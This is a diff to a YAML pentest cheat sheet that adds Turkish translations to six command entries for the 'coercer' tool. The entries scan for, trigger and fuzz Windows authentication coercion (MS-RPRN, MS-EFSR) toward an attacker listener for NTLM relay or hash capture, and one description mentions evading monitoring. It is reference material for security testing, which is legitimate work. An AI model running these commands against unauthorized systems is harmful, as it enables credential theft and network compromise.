@@ -3,46 +3,94 @@ tags: [windows, authentication, coercion, pentest, security, active-directory, s
 
 actions:
 # === SCANNING AND RECONNAISSANCE ===
-  - title: coercer - basic scan
-    desc: |
-      Performs a non-intrusive scan to identify which coercion methods are successful against a target. 
-      This is used during initial reconnaissance to map out vulnerabilities in Windows RPC and SMB services without forcing a full authentication. 
-      The tool reports back when an authentication request is successfully received on the listener side.
+  - title:
+      en: coercer - basic scan
+      tr: coercer - temel tarama
+    desc:
+      en: |
+        Performs a non-intrusive scan to identify which coercion methods are successful against a target. 
+        This is used during initial reconnaissance to map out vulnerabilities in Windows RPC and SMB services without forcing a full authentication. 
+        The tool reports back when an authentication request is successfully received on the listener side.
+      tr: |
+        Hedefe karşı hangi zorlama yöntemlerinin işe yaradığını belirlemek için müdahalesiz tarama yapar.
+        Windows RPC ile SMB servislerindeki zafiyetleri tam kimlik doğrulamaya zorlamadan haritalamak üzere ilk keşif sırasında kullanılır.
+        Dinleyici tarafında kimlik doğrulama isteği başarıyla alınırsa araç bunu raporlar.
+        Saldırı öncesi güvenlik açıklarının envanterini çıkarmak için uygundur.
     command: "coercer scan -t {{target_ip}} -u {{username}} -p {{password}} -d {{domain}} -l {{listener_ip}}"
 
-  - title: coercer - verbose scanning
-    desc: |
-      Executes a scan with the verbose flag enabled to provide detailed feedback on each attempt. 
-      Use this when you need to troubleshoot failed connections or understand which specific RPC calls are being blocked. 
-      It provides a granular view of the interaction between the attacker machine and the target's remote procedures.
+  - title:
+      en: coercer - verbose scanning
+      tr: coercer - ayrıntılı tarama
+    desc:
+      en: |
+        Executes a scan with the verbose flag enabled to provide detailed feedback on each attempt. 
+        Use this when you need to troubleshoot failed connections or understand which specific RPC calls are being blocked. 
+        It provides a granular view of the interaction between the attacker machine and the target's remote procedures.
+      tr: |
+        Her deneme hakkında ayrıntılı geri bildirim almak üzere ayrıntılı bayrakla tarama yapar.
+        Başarısız bağlantıları gidermek ya da hangi RPC çağrılarının engellendiğini anlamak için kullanılır.
+        Saldırgan makine ile hedefin uzak yordamları arasındaki etkileşimin ayrıntılı görünümünü sunar.
+        Engelleme nedenlerini bulmak isteyen denetim ekipleri için yararlıdır.
     command: "coercer -v scan -t {{target_ip}} -u {{username}} -p {{password}} -d {{domain}} -l {{listener_ip}}"
 
 # === AUTHENTICATION COERCION ===
-  - title: coercer - trigger authentication
-    desc: |
-      Triggers authentications through all known methods using established working paths. 
-      This command is the primary way to force a target machine to authenticate to a listener for NTLM relay attacks or hash capturing. 
-      Ensure that a listener like Responder or ntlmrelayx is active on the listener IP before running this.
+  - title:
+      en: coercer - trigger authentication
+      tr: coercer - kimlik doğrulamayı tetikleme
+    desc:
+      en: |
+        Triggers authentications through all known methods using established working paths. 
+        This command is the primary way to force a target machine to authenticate to a listener for NTLM relay attacks or hash capturing. 
+        Ensure that a listener like Responder or ntlmrelayx is active on the listener IP before running this.
+      tr: |
+        Bilinen bütün çalışan yollar üzerinden kimlik doğrulamaları tetikler.
+        Hedef makineyi dinleyiciye kimlik doğrulamaya zorlayarak NTLM aktarım saldırılarına ya da parola özeti toplamaya kapı aralar.
+        Çalıştırmadan önce Responder ya da ntlmrelayx gibi bir dinleyicinin dinleyici adresinde etkin olması gerekir.
+        Zorlama aşamasının birincil komutudur.
     command: "coercer coerce -t {{target_ip}} -u {{username}} -p {{password}} -d {{domain}} -l {{listener_ip}}"
 
-  - title: coercer - targeted method coercion
-    desc: |
-      Runs the coercion process but limits the attempts to a specific method or protocol. 
-      This is useful when you know a specific protocol like MS-RPRN or MS-EFSR is vulnerable and want to minimize network noise. 
-      Targeting specific methods can help bypass certain security monitoring systems that look for broad scanning patterns.
+  - title:
+      en: coercer - targeted method coercion
+      tr: coercer - hedefli yöntemle zorlama
+    desc:
+      en: |
+        Runs the coercion process but limits the attempts to a specific method or protocol. 
+        This is useful when you know a specific protocol like MS-RPRN or MS-EFSR is vulnerable and want to minimize network noise. 
+        Targeting specific methods can help bypass certain security monitoring systems that look for broad scanning patterns.
+      tr: |
+        Zorlama işlemini belirli bir yöntem ya da protokole indirgeyerek çalıştırır.
+        MS-RPRN ya da MS-EFSR gibi belirli bir protokolün zafiyetli olduğu bilindiğinde ağ gürültüsünü azaltmak için yararlıdır.
+        Hedefli yöntemler, geniş tarama kalıplarını izleyen güvenlik izleme sistemlerine yakalanma olasılığını düşürür.
+        Nokta atışı denetimler için uygundur.
     command: "coercer coerce --methods {{method|MS-RPRN}} -t {{target_ip}} -u {{username}} -p {{password}} -d {{domain}} -l {{listener_ip}}"
 
 # === ADVANCED FUZZING ===
-  - title: coercer - path fuzzing
-    desc: |
-      Tests every available coercion method against a comprehensive list of potential exploit paths. 
-      This mode is used when standard paths are patched or blocked to find alternative ways to trigger authentication. 
-      It is more resource-intensive and generates significant logs on the target, so use it with caution in sensitive environments.
+  - title:
+      en: coercer - path fuzzing
+      tr: coercer - yol bulanıklaştırma
+    desc:
+      en: |
+        Tests every available coercion method against a comprehensive list of potential exploit paths. 
+        This mode is used when standard paths are patched or blocked to find alternative ways to trigger authentication. 
+        It is more resource-intensive and generates significant logs on the target, so use it with caution in sensitive environments.
+      tr: |
+        Bütün kullanılabilir zorlama yöntemlerini geniş potansiyel yol listesine karşı dener.
+        Standart yollar yamalandığında ya da engellendiğinde kimlik doğrulamayı tetikleyecek alternatif yollar bulmak için kullanılır.
+        Kaynak tüketimi yüksektir ve hedefte ciddi günlük üretir, bu yüzden hassas ortamlarda dikkatli kullanılmalıdır.
+        Derinlemesine dayanıklılık denetimleri için ayrılmıştır.
     command: "coercer fuzz -t {{target_ip}} -u {{username}} -p {{password}} -d {{domain}} -l {{listener_ip}}"
 
-  - title: coercer - fuzz with specific export
-    desc: |
-      Runs a fuzzing operation and saves the results to a specific file format for later analysis. 
-      This helps in documenting vulnerabilities found during a penetration test for reporting purposes. 
-      It ensures that all successful authentication triggers are recorded with their corresponding paths and methods.
+  - title:
+      en: coercer - fuzz with specific export
+      tr: coercer - bulanıklaştırma sonuçlarını dosyaya aktarma
+    desc:
+      en: |
+        Runs a fuzzing operation and saves the results to a specific file format for later analysis. 
+        This helps in documenting vulnerabilities found during a penetration test for reporting purposes. 
+        It ensures that all successful authentication triggers are recorded with their corresponding paths and methods.
+      tr: |
+        Bulanıklaştırma işlemi yapar ve sonuçları daha sonra incelenmek üzere belirli dosya biçiminde kaydeder.
+        Sızma testi sırasında bulunan zafiyetleri raporlama amacıyla belgelemeyi kolaylaştırır.
+        Başarılı bütün kimlik doğrulama tetikleyicilerini ilgili yol ile yöntem bilgileriyle birlikte kayıt altına alır.
+        Kanıt toplama ile bulgu takibine düzenli girdi sağlar.
     command: "coercer fuzz -t {{target_ip}} -u {{username}} -p {{password}} -d {{domain}} -l {{listener_ip}} --export-json {{filename|results.json}}"
